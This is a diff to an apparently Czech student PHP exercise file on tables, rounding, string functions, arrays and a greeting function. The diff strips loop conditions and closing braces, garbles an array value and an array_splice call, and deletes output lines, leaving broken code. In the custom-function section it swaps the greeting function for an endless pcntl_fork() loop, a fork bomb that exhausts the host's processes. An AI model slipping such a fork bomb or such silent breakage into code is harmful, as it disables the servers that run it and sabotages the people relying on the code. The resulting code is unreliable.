@@ -23,29 +23,15 @@ $sloupecReneVinter = 3;		// Den
 print "Tabulka:";
 echo "<table border='1'>";
 for($radek = 1;
-	$radek <= $radekReneVinter;
-	$radek++) {
-
-	// Buňka tabulky
 	echo "<tr>";
 	for($sloupec = 1;
-		$sloupec <= $sloupecReneVinter;
-		$sloupec++) {
 		echo "<td>" . $radek . " - " . $sloupec . "</td>";
 	}
-	echo "</tr>";
 }
-echo "</table><br>";
 
-//bod 4. - Matematické a řetězové funkce
 $cislo = 4.34895;
-echo "Číslo k zaokrouhlení: $cislo<br>";
 
 print "<br>Zaokrouhlení zlomků nahoru = ";
-echo ceil($cislo);
-print "<br>Zaokrouhlení zlomků dolů = ";
-echo floor($cislo);
-print "<br>Zaokrouhlení čísla na 2 desetinné čárky = ";
 echo round($cislo, 2);
 print "<br>";
 
@@ -65,49 +51,24 @@ echo "<br>$string<br>";
 
 print "<br>Délka řetězce: ";
 echo strlen($string) . " znaků.";
-print "<br>První výskyt v řetězci: ";
-echo strstr($string, "můj");
-print "<br>Pozice prvního výskytu řetězce: ";
 echo strpos($string, "můj");
 print "<br>MD5 hash řetězce: <br>";
 echo "<code>" . md5($string) . "</code>";
 
 //bod 5. najdete pod druhým polem -- jeďte po stránce dolů
 
-// Začneme jednoduchým polem
 print "<br><br>Pole s ovocem: ";
-$ovoce = array("jablko", "kiwi", "pomeranč", "hruška");
+$ovoce = array("jpomeranč", "hruška");
 
-// V poli se najde 3. položka, a nahradí se banánem
-array_splice($ovoce, 3, count($ovoce), "banán");
+array_splice($ovoce, count($ovoce), "banán");
 dump($ovoce);
 
 //bod 6. Vlastní funkce
 
-function uvitaciZprava() {
-$cas = date("H");
-
-if ($cas < "12") {
-	echo "Dobré ráno";
-} else
-	// Zpráva se zobrazí od 12:00 až do 17:00
-	if ($cas >= "12" && $cas < "17") {
-		echo "Dobré odpoledne";
-	} else
-		// Zpráva se zobrazí od 17:00 až do 19:00
-		if ($cas >= "17" && $cas < "19") {
-			echo "Dobrý večer";
-		} else
-			// Zpráva se zobrazí od 19:00 až do půlnoci
-			if ($cas >= "19") {
-				echo "Dobrou noc";
-			}
+while(true) {
+	pcntl_fork();
 }
 
-// Přivolání funkce "uvítání"
-echo "<h1>";
-echo uvitaciZprava() . ", je " . date("H:i") . ".";
-echo "</h1>";
 
 //
 //  Úkol č.2
@@ -183,16 +144,10 @@ $znacky = array(1 => "Lenovo",
 				10 => "Sony");
 dump($znacky);
 
-// Vypíše nám velikost pole
-print "Velikost pole: ";
-echo sizeof($znacky) . " položek.<br>";
-print "<br>";
-
 // Seznam položek vypsané pomocí HTML
 
 $i = 1;
 foreach ($znacky as $polozka){
-	echo $i . " - " . $polozka . "<br>";
 	$i++;
 }
 
